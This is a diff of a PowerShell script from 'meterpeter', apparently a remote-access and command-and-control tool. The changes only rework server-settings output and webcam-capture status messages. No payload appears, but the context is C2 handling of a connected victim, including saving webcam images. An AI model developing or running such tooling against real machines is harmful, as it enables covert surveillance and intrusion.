@@ -390,7 +390,6 @@ While($Client.Connected)
     {
       $Parse = "$IPATH"+"meterpeter.ps1"
       $SerSat = "$Local_Host"+":"+"$Local_Port";
-      $NetInter = Get-NetIPConfiguration|findstr /C:"InterfaceDescription";$Report = $NetInter[0];
       write-host "`n`n Server Settings" -ForegroundColor green;
       write-host " ---------------";
       write-host " meterpeter dev       : $dev_Version";
@@ -400,7 +399,6 @@ While($Client.Connected)
       write-host " Lhost|Lport Settings : $SerSat";
       write-host " meterpeter WebServer : $APACHE";
       write-host " meterpeter Server    : $Parse";
-      write-host " $Report";
     }
 
     ## venom v1.0.16 function
@@ -1656,8 +1654,8 @@ While($Client.Connected)
             $Cam_set = "False";
           }else{
             $OutPut = $OutPut -replace "`n","";
-            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
-            Write-Host "   ------   ---------";
+            Write-Host "`n`n   Status   Remote Path" -ForeGroundColor green;
+            Write-Host "   ------   -----------";
             Write-Host "   saved    $OutPut";
           }
           If($Flipflop -eq "True")
@@ -1667,7 +1665,7 @@ While($Client.Connected)
           }
           If($Camflop  -eq "True")
           {
-            write-host "   image    $env:tmp\image.bmp" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
+            write-host "   image    `$env:tmp\image.bmp" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
             $Camflop = "False";
           }
           $Command = $Null;
